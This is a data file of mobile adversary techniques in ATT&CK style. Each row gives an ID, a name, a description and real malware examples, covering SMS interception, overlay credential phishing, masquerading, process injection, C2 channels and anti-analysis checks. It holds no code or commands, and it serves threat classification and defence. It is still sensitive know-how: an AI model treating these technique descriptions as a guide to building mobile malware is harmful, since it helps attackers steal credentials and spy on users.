T1412,Capture SMS Messages,"A malicious application could capture sensitive data sent via SMS, including authentication credentials. SMS is frequently used to transmit codes used for multi-factor authentication.  On Android, a malicious application must request and obtain permission (either at app install time or run time) in order to receive SMS messages. Alternatively, a malicious application could attempt to perform an operating system privilege escalation attack to bypass the permission requirement.  On iOS, applications cannot access SMS messages in normal operation, so an adversary would need to attempt to perform an operating system privilege escalation attack to potentially be able to access SMS messages.",[],True
T1642,Endpoint Denial of Service,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users.  On Android versions prior to 7, apps can abuse Device Administrator access to reset the device lock passcode, preventing the user from unlocking the device. After Android 7, only device or profile owners (e.g. MDMs) can reset the device’s passcode.  On iOS devices, this technique does not work because mobile device management servers can only remove the screen lock passcode; they cannot set a new passcode. However, on jailbroken devices, malware has been discovered that can lock the user out of the device.","['[Xbot] can remotely lock infected Android devices and ask for a ransom.', '[GPlayed] can lock the user out of the device by showing a persistent overlay.', '[Charger] locks the device if it is granted admin permissions, displaying a message demanding a ransom payment.', '[Exobot] can lock the device with a password and permanently disable the screen.']",False
T1644,Out of Band Data,"Adversaries may communicate with compromised devices using out of band data streams. This could be done for a variety of reasons, including evading network traffic monitoring, as a backup method of command and control, or for data exfiltration if the device is not connected to any Internet-providing networks (i.e. cellular or Wi-Fi). Several out of band data streams exist, such as SMS messages, NFC, and Bluetooth.      On Android, applications can read push notifications to capture content from SMS messages, or other out of band data streams. This requires that the user manually grant notification access to the application via the settings menu. However, the application could launch an Intent to take the user directly there.      On iOS, there is no way to programmatically read push notifications. ","['[Desert Scorpion] can be controlled using SMS messages.', '[Monokle] can be controlled via email and SMS from a set of ""control phones.""', '[SharkBot] can use the “Direct Reply” feature of Android to automatically reply to notifications with a message provided by C2.', '[Rotexy] can be controlled through SMS messages.', '[Pegasus for iOS] uses SMS for command and control.', '[Stealth Mango] uses commands received from text messages for C2.', '[TrickMo] can be controlled via encrypted SMS message.', '[RCSAndroid] can use SMS for command and control.', '[SpyDealer] enables remote control of the victim through SMS channels.', ' [Gustuff] can use SMS for command and control from a defined admin phone number. ', '[BOULDSPY] can use SMS to send C2 commands.', '[Skygofree] can be controlled via binary SMS.', '[Android/Chuli.A] used SMS to receive command and control messages.', '[BusyGasper] can perform actions when one of two hardcoded magic SMS strings is received.', '[CarbonSteal] has used specially crafted SMS messages to control the target device. ', '[Pegasus for Android] uses SMS for command and control.']",False
T1521,Encrypted Channel,"Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",['[Twitoor] encrypts its C2 communication.'],False
T1405,Exploit TEE Vulnerability,"A malicious app or other attack vector could be used to exploit vulnerabilities in code running within the Trusted Execution Environment (TEE) . The adversary could then obtain privileges held by the TEE potentially including the ability to access cryptographic keys or other sensitive data . Escalated operating system privileges may be first required in order to have the ability to attack the TEE . If not, privileges within the TEE can potentially be used to exploit the operating system .",[],False
T1399,Modify Trusted Execution Environment,"If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device's Trusted Execution Environment (TEE) or other similar isolated execution environment where the code can evade detection, may persist after device resets, and may not be removable by the device user. Running code within the TEE may provide an adversary with the ability to monitor or tamper with overall device behavior.",[],False
T1459,Device Unlock Code Guessing or Brute Force,,[],True
T1466,Downgrade to Insecure Protocols,"An adversary could cause the mobile device to use less secure protocols, for example by jamming frequencies used by newer protocols such as LTE and only allowing older protocols such as GSM to communicate. Use of less secure protocols may make communication easier to eavesdrop upon or manipulate.",[],True
T1655,Masquerading,"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name, location, or appearance of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.  Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading] ",[],False
T1472,Generate Fraudulent Advertising Revenue,"An adversary could seek to generate fraudulent advertising revenue from mobile devices, for example by triggering automatic clicks of advertising links without user involvement.",[],True
T1473,Malicious or Vulnerable Built-in Device Functionality,,['Adups is pre-installed on Android devices from some vendors.'],True
T1449,Exploit SS7 to Redirect Phone Calls/SMS,An adversary could exploit signaling system vulnerabilities to redirect calls or text messages (SMS) to a phone number under the attacker's control. The adversary could then act as an adversary-in-the-middle to intercept or manipulate the communication.      Interception of SMS messages could enable adversaries to obtain authentication codes used for multi-factor authentication.,['[Circles] can intercept voice calls and SMS messages.'],False
T1628,Hide Artifacts,"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Mobile operating systems have features and developer APIs to hide various artifacts, such as an application’s launcher icon. These APIs have legitimate usages, such as hiding an icon to avoid application drawer clutter when an application does not have a usable interface. Adversaries may abuse these features and APIs to hide artifacts from the user to evade detection.",[],False
T1456,Drive-By Compromise,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring an [Application Access Token]  Multiple ways of delivering exploit code to a browser exist, including:  * A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting. * Malicious ads are paid for and served through legitimate ad providers. * Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).  Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.  Typical drive-by compromise process:  1. A user visits a website that is used to host the adversary controlled content. 2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.      * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes. 3. Upon finding a vulnerable version, exploit code is delivered to the browser. 4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.     * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.","['[Pegasus for iOS] was distributed through a web site by exploiting vulnerabilities in the Safari web browser on iOS devices.', '[YiSpecter] is believed to have initially infected devices using internet traffic hijacking to generate abnormal popups. ', '[Stealth Mango] is delivered via a a watering hole website that mimics the third-party Android app store APKMonk. In at least one case, the watering hole URL was distributed through Facebook Messenger.', '[INSOMNIA] has utilized malicious JavaScript and iframes to exploit WebKit running on vulnerable iOS 12 devices.']",False
T1508,Suppress Application Icon,"A malicious application could suppress its icon from being displayed to the user in the application launcher to hide the fact that it is installed, and to make it more difficult for the user to uninstall the application. Hiding the application's icon programmatically does not require any special permissions.  This behavior has been seen in the BankBot/Spy Banker family of malware.",[],True
T1630.001,Uninstall Malicious Application,"Adversaries may include functionality in malware that uninstalls the malicious application from the device. This can be achieved by:    * Abusing device owner permissions to perform silent uninstallation using device owner API calls.  * Abusing root permissions to delete files from the filesystem.  * Abusing the accessibility service. This requires sending an intent to the system to request uninstallation, and then abusing the accessibility service to click the proper places on the screen to confirm uninstallation.","['[SharkBot] has C2 commands that can uninstall the app from the infected device.', '[S.O.V.A.] can uninstall itself.', '[TrickMo] can uninstall itself from a device on command by abusing the accessibility service. ', '[Cerberus] can uninstall itself from a device on command.', '[Escobar] can uninstall itself and other applications.']",False
T1430.002,Impersonate SS7 Nodes,"Adversaries may exploit the lack of authentication in signaling system network nodes to track the to track the location of mobile devices by impersonating a node.      By providing the victim’s MSISDN (phone number) and impersonating network internal nodes to query subscriber information from other nodes, adversaries may use data collected from each hop to eventually determine the device’s geographical cell area or nearest cell tower.",['[Circles] can track the location of mobile devices.'],False
T1655.001,Match Legitimate Name or Location,"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by giving artifacts the name and icon of a legitimate, trusted application (i.e., Settings), or using a package name that matches legitimate, trusted applications (i.e., `com.google.android.gm`).   Adversaries may also use the same icon of the file or application they are trying to mimic. ","['[Mandrake] can mimic an app called “Storage Settings” if it cannot hide its icon.', '[X-Agent for Android] was placed in a repackaged version of an application used by Ukrainian artillery forces.', '[ViperRAT] second stage has masqueraded as “System Updates”, “Viber Update”, and “WhatsApp Update”.', '[Hornbill] has impersonated chat applications such as Fruit Chat, Cucu Chat, and Kako Chat. ', '[EventBot] has used icons from popular applications.', '[DroidJack] included code from the legitimate Pokemon GO app in order to appear identical to the user, but it also included additional malicious code.', '[Chameleon] has disguised itself as other applications, such as a cryptocurrency app called ‘CoinSpot’, and IKO bank in Poland. It has also used familiar icons, such as the Chrome and Bitcoin logos. ', '[CarbonSteal] has impersonated several apps, including official Google apps, chat apps, VPN apps, and popular games.', '[CHEMISTGAMES] has masqueraded as popular South Korean applications.', '[Cerberus] has pretended to be an Adobe Flash Player installer.', '[GoldenEagle] has inserted trojan functionality into legitimate apps, including popular apps within the Uyghur community, VPNs, instant messaging apps, social networking, games, adult media, and Google searching.', '[Tiktok Pro] has masqueraded as TikTok.', '[GPlayed] has used the Play Store icon as well as the name “Google Play Marketplace”.', '[WolfRAT] has masqueraded as “Google service”, “GooglePlay”, and “Flash update”.', '[Dendroid] can be bound to legitimate applications prior to installation on devices.', '[Android/AdDisplay.Ashas] has mimicked Facebook and Google icons on the “Recent apps” screen to avoid discovery and uses the `com.google.xxx` package name to avoid detection.', '[Red Alert 2.0] has masqueraded as legitimate media player, social media, and VPN applications.', '[Anubis] has requested accessibility service privileges while masquerading as ""Google Play Protect"" and has disguised additional malicious application installs as legitimate system updates.', '[Exobot] has used names like WhatsApp and Netflix.', '[HenBox] has masqueraded as VPN and Android system apps.', '[Bouncing Golf] distributed malware as repackaged legitimate applications, with the malicious code in the `com.golf` package.', '[Ginp] has masqueraded as “Adobe Flash Player” and “Google Play Verificator”.', '[MoustachedBouncer] has used legitimate looking filenames for malicious executables including MicrosoftUpdate845255.exe.', '[BOULDSPY] has been installed using the package name `com.android.callservice`, pretending to be an Android system service.', '[FrozenCell] has masqueraded as fake updates to chat applications such as Facebook, WhatsApp, Messenger, LINE, and LoveChat, as well as apps targeting Middle Eastern demographics. ', '[SilkBean] has been incorporated into trojanized applications, including Uyghur/Arabic focused keyboards, alphabets, and plugins, as well as official-looking Google applications.', '[Fakecalls] has masqueraded as popular Korean banking apps.', '[ViceLeaker] was embedded into legitimate applications using Smali injection.', '[Asacub] has masqueraded as a client of popular free ads services.', '[SimBad] was embedded into legitimate applications.', '[FakeSpy] masquerades as local postal service applications.', '[Agent Smith] can impersonate any popular application on an infected device, and the core malware disguises itself as a legitimate Google application. [Agent Smith] dropper is a weaponized legitimate Feng Shui Bundle. ', '[XLoader for Android] has masqueraded as an Android security application.', '[DoubleAgent] has been embedded into trojanized versions of applications such as Voxer, TalkBox, and Amaq News.', '[AndroidOS/MalLocker.B] has masqueraded as popular apps, cracked games, and video players. ']",False
T1521.002,Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic, rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private that should not be distributed. Due to how asymmetric algorithms work, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA, ElGamal, and ECDSA.  For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography]","['[eSurv] Android version has used public key encryption and certificate pinning for C2 communication.', '[CHEMISTGAMES] has used HTTPS for C2 communication. ', '[CarbonSteal] has performed rudimentary SSL certificate validation to verify C2 server authenticity before establishing a SSL connection.', '[SharkBot] has used RSA to encrypt the symmetric encryption key used for C2 messages.', '[SilkBean] has used HTTPS for C2 communication.', '[FluBot] has encrypted C2 message bodies with RSA and encoded them in base64.']",False
T1636.002,Call Log,"Adversaries may utilize standard operating system APIs to gather call log data. On Android, this can be accomplished using the Call Log Content Provider. iOS provides no standard API to access the call log.      If the device has been jailbroken or rooted, an adversary may be able to access the [Call Log] without the user’s knowledge or approval. ","['[HenBox] has collected all outgoing phone numbers that start with “86”.', '[WolfRAT] can collect the device’s call log.', '[AndroRAT] collects call logs.', '[Fakecalls] can access the device’s call log.', '[Android/Chuli.A] stole call logs.', '[Pegasus for iOS] captures call logs.', '[Corona Updates] can collect the device’s call log.', '[Pallas] accesses and exfiltrates the call log.', '[Pegasus for Android] accesses call logs.', '[DoubleAgent] has accessed the call logs.', '[Tangelo] contains functionality to gather call logs.', '[Stealth Mango] uploads call logs.', '[ViceLeaker] can collect the device’s call log.', '[FinFisher] accesses and exfiltrates the call log.', '[SpyDealer] harvests phone call history from victims.', '[Sunbird] can exfiltrate call logs.', '[INSOMNIA] can retrieve the call history.', '[Drinik] can request the `READ_CALL_LOG` permission.', '[SilkBean] can access call logs.', '[AbstractEmu] can access device call logs.', '[Hornbill] can gather device call logs.', '[BOULDSPY] can access device call logs.', '[Escobar] can access the device’s call log.', '[Tiktok Pro] can collect the device’s call logs.', '[DroidJack] captures call data.', '[ViperRAT] can collect the device’s call log.', '[Monokle] can retrieve call history.', '[GolfSpy] can obtain the device’s call log.', '[TangleBot] can request permission to view call logs.', '[Exodus] Two can exfiltrate the call log. ', '[GoldenEagle] has collected call logs.', '[Adups] transmitted call logs.', '[Red Alert 2.0] can collect the device’s call log.']",False
T1418.001,Security Software Discovery,"Adversaries may attempt to get a listing of security applications and configurations that are installed on a device. This may include things such as mobile security products. Adversaries may use the information from [Security Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions. ","['[Gustuff] checks for antivirus software contained in a predefined list.', '[Exobot] can obtain a list of installed applications and can detect if an antivirus application is running, and close it if it is.']",False
T1631.001,Ptrace System Calls,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.    Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (e.g., by using `malloc`) then invoking that memory with `PTRACE_SETREGS` to set the register containing the next instruction to execute. Ptrace system call injection can also be done with `PTRACE_POKETEXT`/`PTRACE_POKEDATA`, which copy data to a specific address in the target process's memory (e.g., the current address of the next instruction).    Ptrace system call injection may not be possible when targeting processes with high-privileges, and on some systems those that are non-child processes.    Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.","['[INSOMNIA] grants itself permissions by injecting its hash into the kernel’s trust cache.', '[Zen] can inject code into the Setup Wizard at runtime to extract CAPTCHA images. [Zen] can inject code into the `libc` of running processes to infect them with the malware.', '[Triada] injects code into the Zygote process to effectively include itself in all forked processes. Additionally, code is injected into the Android Play Store App, web browser applications, and the system UI application.']",False
T1437.001,Web Protocols,"Adversaries may communicate using application layer protocols associated with web protocols traffic to avoid detection/network filtering by blending in with existing traffic. Commands to remote mobile devices, and often the results of those commands, will be embedded within the protocol traffic between the mobile client and server.   Web protocols such as HTTP and HTTPS are used for web traffic as well as well as notification services native to mobile messaging services such as Google Cloud Messaging (GCM) and newly, Firebase Cloud Messaging (FCM), (GCM/FCM: two-way communication) and Apple Push Notification Service (APNS; one-way server-to-device).  Such notification services leverage HTTP/S via the respective API and are commonly abused on Android and iOS respectively in order blend in with routine device traffic making it difficult for enterprises to inspect. ","['[GPlayed] has communicated with the C2 using HTTP requests or WebSockets as a backup. ', '[FlyTrap] can use HTTP to communicate with the C2 server.', '[EventBot] communicates with the C2 using HTTP requests.', '[CHEMISTGAMES] has used HTTPS for C2 communication.', '[TrickMo] communicates with the C2 by sending JSON objects over unencrypted HTTP requests.', '[Trojan-SMS.AndroidOS.OpFake.a] uses Google Cloud Messaging (GCM) for command and control.', '[Trojan-SMS.AndroidOS.Agent.ao] uses Google Cloud Messaging (GCM) for command and control.', '[Riltok] communicates with the command and control server using HTTP requests.', '[Chameleon] can use HTTP to communicate with the C2 server.', '[RedDrop] uses HTTP requests for C2 communication.', '[Golden Cup] has communicated with the C2 using MQTT and HTTP.', '[SilkBean] has used HTTPS for C2 communication. ', '[Android/Chuli.A] used HTTP uploads to a URL as a command and control mechanism.', '[Hornbill] can use HTTP and HTTP POST to communicate information to the C2.', '[Exodus] One checks in with the command and control server using HTTP POST requests. ', '[RuMMS] uses HTTP for command and control.', '[Trojan-SMS.AndroidOS.FakeInst.a] uses Google Cloud Messaging (GCM) for command and control.', '[Android/AdDisplay.Ashas] has communicated with the C2 server using HTTP.', '[GoldenEagle] has used HTTP POST requests for C2.', '[AbstractEmu] can use HTTP to communicate with the C2 server.', '[Concipit1248] communicates with the C2 server using HTTP requests.', '[Dark Caracal] controls implants using standard HTTP communication. ', '[YiSpecter] has connected to the C2 server via HTTP.', '[BOULDSPY] uses unencrypted HTTP traffic between the victim and C2 infrastructure.', '[Asacub] has communicated with the C2 using HTTP POST requests.', '[Rotexy] can communicate with the command and control server using JSON payloads sent in HTTP POST request bodies. It can also communicate by using JSON messages sent through Google Cloud Messaging.', '[Cerberus] communicates with the C2 server using HTTP.', '[Corona Updates] communicates with the C2 server using HTTP requests.', '[Exobot] has used HTTPS for C2 communication.', '[FluBot] can use HTTP POST requests on port 80 for communicating with its C2 server.', '[Bread] communicates with the C2 server using HTTP requests.', '[Gustuff] communicates with the command and control server using HTTP requests.', '[DEFENSOR ID] has used Firebase Cloud Messaging for C2. ', '[INSOMNIA] communicates with the C2 server using HTTPS requests.', '[Red Alert 2.0] has communicated with the C2 using HTTP.', '[SharkBot] can use HTTP to send C2 messages to infected devices.', '[ViceLeaker] uses HTTP requests for C2 communication.', '[S.O.V.A.] can use the open-source project RetroFit for C2 communication.', '[Skygofree] can be controlled via HTTP, XMPP, FirebaseCloudMessaging, or GoogleCloudMessaging in older versions.', '[FakeSpy] exfiltrates data using HTTP requests.']",False
T1628.002,User Evasion,"Adversaries may attempt to avoid detection by hiding malicious behavior from the user. By doing this, an adversary’s modifications would most likely remain installed on the device for longer, allowing the adversary to continue to operate on that device.   While there are many ways this can be accomplished, one method is by using the device’s sensors. By utilizing the various motion sensors on a device, such as accelerometer or gyroscope, an application could detect that the device is being interacted with. That way, the application could continue to run while the device is not in use but cease operating while the user is using the device, hiding anything that would indicate malicious activity was ongoing. Accessing the sensors in this way does not require any permissions from the user, so it would be completely transparent.","['[Hornbill] uses an infrequent data upload schedule to avoid user detection and battery drain. It also can delete on-device data after being sent to the C2, and stores collected data in hidden folders on external storage.', '[FluBot] can use `locale.getLanguage()` to choose the language for notifications and avoid user detection.', '[BusyGasper] can utilize the device’s sensors to determine when the device is in use and subsequently hide malicious activity. When active, it attempts to hide its malicious activity by turning the screen’s brightness as low as possible and muting the device.']",False
T1629.003,Disable or Modify Tools,"Adversaries may disable security tools to avoid potential detection of their tools and activities. This can take the form of disabling security software, modifying SELinux configuration, or other methods to interfere with security tools scanning or reporting information. This is typically done by abusing device administrator permissions or using system exploits to gain root access to the device to modify protected system files.","['[Drinik] can use Accessibility Services to disable Google Play Protect.', '[FluBot] can disable Google Play Protect to prevent detection.', '[AbstractEmu] can disable Play Protect.', '[Cerberus] disables Google Play Protect to prevent its discovery and deletion in the future.', '[Anubis] can modify administrator settings and disable Play Protect.', '[Mandrake] can disable Play Protect.', '[Dvmap] can turn off `VerifyApps`, and can grant Device Administrator permissions via commands only, rather than using the UI.', '[Zen] can modify the SELinux enforcement mode.', '[Chameleon] can disable Google Play Protect.']",False
T1639.001,Exfiltration Over Unencrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). Adversaries may employ custom or publicly available encoding/compression algorithms (such as base64) or embed data within protocol headers and fields.","['[BusyGasper] can download text files with commands from an FTP server and exfiltrate data via email.', '[Corona Updates] has exfiltrated data using FTP.']",False
T1624.001,Broadcast Receivers,"Adversaries may establish persistence using system mechanisms that trigger execution based on specific events. Mobile operating systems have means to subscribe to events such as receiving an SMS message, device boot completion, or other device activities.   An intent is a message passed between Android applications or system components. Applications can register to receive broadcast intents at runtime, which are system-wide intents delivered to each app when certain events happen on the device, such as network changes or the user unlocking the screen. Malicious applications can then trigger certain actions within the app based on which broadcast intent was received.   In addition to Android system intents, malicious applications can register for intents broadcasted by other applications. This allows the malware to respond based on actions in other applications. This behavior typically indicates a more intimate knowledge, or potentially the targeting of specific devices, users, or applications.   In Android 8 (API level 26), broadcast intent behavior was changed, limiting the implicit intents that applications can register for in the manifest. In most cases, applications that register through the manifest will no longer receive the broadcasts. Now, applications must register context-specific broadcast receivers while the user is actively using the app. ","['[SpyNote RAT] uses an Android broadcast receiver to automatically start when the device boots.', '[TrickMo] registers for the `SCREEN_ON` and `SMS_DELIVER` intents to perform actions when the device is unlocked and when the device receives an SMS message.', '[AndroidOS/MalLocker.B] has registered to receive 14 different broadcast intents for automatically triggering malware payloads. ', '[Pegasus for Android] listens for the `BOOT_COMPLETED` broadcast intent in order to maintain persistence and activate its functionality at device boot time.', '[SimBad] registers for the `BOOT_COMPLETED` and `USER_PRESENT` broadcast intents, which allows the software to perform actions after the device is booted and when the user is using the device, respectively.', '[FakeSpy] can register for the `BOOT_COMPLETED` broadcast Intent.', '[Exobot] has registered to receive the `BOOT_COMPLETED` broadcast intent.', '[GolfSpy] registers for the `USER_PRESENT` broadcast intent and uses it as a trigger to take photos with the front-facing camera.', '[Tiktok Pro] has registered for device boot, incoming, and outgoing calls broadcast intents.', '[GPlayed] can register for the `BOOT_COMPLETED` broadcast intent.', '[HenBox] has registered several broadcast receivers.', '[TERRACOTTA] has registered several broadcast receivers.', '[Android/AdDisplay.Ashas] has registered to receive the `BOOT_COMPLETED` broadcast intent to activate on device startup.', '[FlexiSpy] uses root access to establish reboot hooks to re-install the application from `/data/misc/adn`. At boot, [FlexiSpy] spawns daemons for process monitoring, call monitoring, call managing, and system.', '[DEFENSOR ID] abuses the accessibility service to auto-start the malware on device boot. This is accomplished by receiving the `android.accessibilityservice.AccessibilityService` intent.', '[SpyDealer] registers the broadcast receiver to listen for events related to device boot-up.', '[EventBot] registers for the `BOOT_COMPLETED` intent to auto-start after the device boots.']",False
T1417.002,GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for sensitive information with a seemingly legitimate prompt. The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII). Compared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique’s use.  There are several approaches adversaries may use to mimic this functionality. Adversaries may impersonate the identity of a legitimate application (e.g. use the same application name and/or icon) and, when installed on the device, may prompt the user for sensitive information. Adversaries may also send fake device notifications to the user that may trigger the display of an input prompt when clicked.   Additionally, adversaries may display a prompt on top of a running, legitimate application to trick users into entering sensitive information into a malicious application rather than the legitimate application. Typically, adversaries need to know when the targeted application and the individual activity within the targeted application is running in the foreground to display the prompt at the proper time. Adversaries can abuse Android’s accessibility features to determine which application is currently in the foreground. Two known approaches to displaying a prompt include:  * Adversaries start a new activity on top of a running legitimate application. Android 10 places new restrictions on the ability for an application to start a new activity on top of another application, which may make it more difficult for adversaries to utilize this technique. * Adversaries create an application overlay window on top of a running legitimate application. Applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows. This permission is handled differently than typical Android permissions and, at least under certain conditions, is automatically granted to applications installed from the Google Play Store. The `SYSTEM_ALERT_WINDOW` permission and its associated ability to create application overlay windows are expected to be deprecated in a future release of Android in favor of a new API.","['[Tiktok Pro] can launch a fake Facebook login page.', '[S.O.V.A.] can use overlays capture banking credentials and credit card information, and can open arbitrary WebViews from the C2.', '[Pallas] uses phishing popups to harvest user credentials.', '[XcodeGhost] can prompt a fake alert dialog to phish user credentials.', ""[Xbot] uses phishing pages mimicking Google Play's payment interface as well as bank login pages."", '[TERRACOTTA] has displayed a form to collect user data after installation.', '[TianySpy] can utilize WebViews to display fake authentication pages that capture user credentials. ', '[EventBot] can display popups over running applications.', '[Dendroid] can open a dialog box to ask the user for passwords.', '[Red Alert 2.0] has used malicious overlays to collect banking credentials.', '[TangleBot] can use overlays to cover legitimate applications or screens.', '[Cerberus] can generate fake notifications and launch overlay attacks against attacker-specified applications.', '[Chameleon] can perform overlay attacks against a device by injecting HTML phishing pages into a webview.', '[FluBot] can add display overlays onto banking apps to capture credit card information.', '[Anubis] can create overlays to capture user credentials for targeted applications.', '[Ginp] can use a multi-step phishing overlay to capture banking credentials and then credit card numbers after login.', '[Drinik] can use overlays to steal user banking credentials entered into legitimate sites.', '[Riltok] can open a fake Google Play screen requesting bank card credentials and mimic the screen of relevant mobile banking apps to request user/bank card details.', ""[Rotexy] can use phishing overlays to capture users' credit card information."", '[Gustuff] uses WebView overlays to prompt the user for their device unlock code, as well as banking and cryptocurrency application credentials. [Gustuff] can also send push notifications pretending to be from a bank, triggering a phishing overlay.', '[SharkBot] can use a WebView with a fake log in site to capture banking credentials.', '[FlyTrap] has used infected applications with Facebook login prompts to steal credentials.', '[Mandrake] can manipulate visual components to trick the user into granting dangerous permissions, and can use phishing overlays and JavaScript injection to capture credentials.', '[Exobot] can show phishing popups when a targeted application is running.', '[Marcher] attempts to overlay itself on top of legitimate banking apps in an effort to capture user credentials. [Marcher] also attempts to overlay itself on top of legitimate apps such as the Google Play Store in an effort to capture user credit card information.', '[GPlayed] can show a phishing WebView pretending to be a Google service that collects credit card information.', '[Escobar] can collect credentials using phishing overlays.']",False
T1406.002,Software Packing,"Adversaries may perform software packing to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.   Utilities used to perform software packing are called packers. An example packer is FTT. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.","['[Bread] payloads have used several commercially available packers.', '[Gustuff] code is both obfuscated and packed with an FTT packer.', '[S.O.V.A.] has been distributed in obfuscated and packed form.']",False
T1623.001,Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the underlying command prompts on Android and iOS devices. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges that are only accessible if the device has been rooted or jailbroken.   Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.   Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.   If the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user. This dangerous level of permissions allows the adversary to run special commands and modify protected system files.  ","['[AbstractEmu] has included encoded shell scripts to potentially aid in the rooting process.', '[Sunbird] can try to run arbitrary commands as root.', '[HenBox] can run commands as root. ', '[DoubleAgent] can run arbitrary shell commands.', '[CHEMISTGAMES] can run bash commands.', '[BusyGasper] can run shell commands.', '[Tiktok Pro] can execute commands .']",False
T1633.001,System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behavior after checking for the presence of artifacts indicative of a virtual environment or sandbox. If the adversary detects a virtual environment, they may alter their malware’s behavior to disengage from the victim or conceal the core functions of the implant. They may also search for virtualization artifacts before dropping secondary or additional payloads.   Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size.   Hardware checks, such as the presence of motion sensors, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices. ","['[AbstractEmu] can check device system properties to potentially avoid running while under analysis.', '[Android/AdDisplay.Ashas] can check that the device IP is not in the range of known Google IP addresses before triggering the payload and can delay payload deployment to avoid detection during testing and avoid association with unwanted ads.', '[Dendroid] can detect if it is being ran on an emulator.', '[Mandrake] can evade automated analysis environments by requiring a CAPTCHA on launch that will prevent the application from running if not passed. It also checks for indications that it is running in an emulator.', '[Ginp] can determine if it is running in an emulator.', '[HenBox] can detect if the app is running on an emulator.', '[Chameleon] can perform system checks to verify if the device is rooted or has ADB enabled and can avoid execution if found.', '[TERRACOTTA] checks whether its call stack has been modified, an indication that it is running in an analysis environment, and if so, does not decrypt its obfuscated strings.', '[Windshift] has deployed anti-analysis capabilities during their Operation BULL campaign.', '[Cerberus] avoids being analyzed by only activating the malware after recording a certain number of steps from the accelerometer.', '[Rotexy] checks if it is running in an analysis environment. ', '[FakeSpy] can detect if it is running in an emulator and adjust its behavior accordingly.', '[Anubis] has used motion sensor data  to attempt to determine if it is running in an emulator.', '[WolfRAT] can perform primitive emulation checks.', '[TrickMo] can detect if it is running on a rooted device or an emulator.']",False
